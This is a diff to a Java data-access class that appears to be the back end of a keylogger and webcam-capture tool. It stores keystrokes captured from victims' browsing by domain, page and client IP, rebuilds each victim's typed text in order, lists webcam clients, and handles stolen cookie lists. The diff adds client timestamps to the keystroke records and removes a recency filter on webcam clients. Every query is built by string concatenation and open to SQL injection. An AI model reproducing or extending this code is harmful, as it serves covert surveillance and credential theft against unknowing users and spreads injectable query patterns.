@@ -6,9 +6,7 @@ import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.sql.Statement;
 import java.text.ParseException;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
 
 import com.eh.openshiftapp.model.KeyloggedUser;
@@ -62,9 +60,9 @@ public class ApplicationDao extends SqlQueries {
 		return cookieList;
 	}
 
-	public void logPressedKeys(String domain, String page, String pressedKey, String clientIP) throws SQLException {
-		final String SQL_QUERY = "insert into KEY_LOGGER (domain, page, pressed_key, client_ip, created_date) values ('"
-				+ domain + "', '" + page + "', '" + pressedKey + "', '" + clientIP + "', now())";
+	public void logPressedKeys(String domain, String page, String pressedKey, String clientIP, String clientTime) throws SQLException {
+		final String SQL_QUERY = "insert into KEY_LOGGER (domain, page, pressed_key, client_ip, client_time_millis, created_date) values ('"
+				+ domain + "', '" + page + "', '" + pressedKey + "', '" + clientIP + "', '" + clientTime + "', now())";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -73,7 +71,7 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public List<KeyloggedUser> getKeyloggedUsers(String logDate) throws SQLException {
-		final String SQL_QUERY = "select client_ip, domain, max(created_date) dt from KEY_LOGGER where created_date like '"
+		final String SQL_QUERY = "select client_ip, domain, max(client_time_millis) dt from KEY_LOGGER where created_date like '"
 				+ logDate + "%' group by client_ip, domain order by dt desc";
 
 		connection = jdbcConnection.openConnection();
@@ -94,7 +92,7 @@ public class ApplicationDao extends SqlQueries {
 
 	public String getKeylogs(String logDate, String clientIP, String domain) throws SQLException, ParseException {
 		final String SQL_QUERY = "select * from KEY_LOGGER where created_date like '" + logDate + "%' and client_ip = '"
-				+ clientIP + "' and domain = '" + domain + "' order by created_date";
+				+ clientIP + "' and domain = '" + domain + "' order by client_time_millis";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -102,16 +100,15 @@ public class ApplicationDao extends SqlQueries {
 
 		String keylogs = null;
 		String pressedKey = null;
-		Date previousDateTime = null;
-		Date currentDateTime = null;
+		long previousTimeMillis = 0;
+		long currentTimeMillis = 0;
 		StringBuffer keylogsBuffer = new StringBuffer();
-		SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
 
 		while (resultSet.next()) {
 			pressedKey = resultSet.getString("PRESSED_KEY");
-			currentDateTime = dateFormat.parse(resultSet.getString("CREATED_DATE"));
-			ApplicationUtility.appendKeylogs(pressedKey, keylogsBuffer, previousDateTime, currentDateTime);
-			previousDateTime = currentDateTime;
+			currentTimeMillis = resultSet.getLong("CLIENT_TIME_MILLIS");
+			ApplicationUtility.appendKeylogs(pressedKey, keylogsBuffer, previousTimeMillis, currentTimeMillis);
+			previousTimeMillis = currentTimeMillis;
 		}
 
 		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
@@ -123,7 +120,7 @@ public class ApplicationDao extends SqlQueries {
 	public List<KeyloggedUser> getDetailedKeylogs(String logDate, String clientIP, String domain)
 			throws SQLException, ParseException {
 		final String SQL_QUERY = "select * from KEY_LOGGER where created_date like '" + logDate + "%' and client_ip = '"
-				+ clientIP + "' and domain = '" + domain + "' order by created_date desc";
+				+ clientIP + "' and domain = '" + domain + "' order by client_time_millis";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -181,7 +178,8 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public List<Webcam> getWebcamClients() throws SQLException {
-		final String SQL_QUERY = "select * from WEBCAM where (timediff(now(), modified_date) < '00:00:15') order by modified_date desc";
+		//final String SQL_QUERY = "select * from WEBCAM where (timediff(now(), modified_date) < '00:00:15') order by modified_date desc";
+		final String SQL_QUERY = "select * from WEBCAM order by modified_date desc";
 		// final String SQL_QUERY = "select * from webcam where (timediff(now(),
 		// modified_date) < '24:00:00') order by modified_date desc";
 
